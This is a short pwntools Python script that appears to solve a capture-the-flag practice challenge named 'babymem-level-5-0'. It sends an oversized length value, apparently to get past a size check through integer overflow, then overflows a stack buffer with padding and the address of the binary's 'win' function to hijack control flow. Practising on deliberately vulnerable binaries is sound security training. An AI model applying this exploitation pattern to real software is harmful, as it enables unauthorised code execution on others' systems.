#!/usr/bin/python3
from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/./babymem-level-5-0', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

padding = b'A' *  31 + b'B' * 25
pl = padding + p64(exe.sym.win)

p.sendline(b'429496730')
p.sendline(b'10')
p.send(pl)
p.interactive()
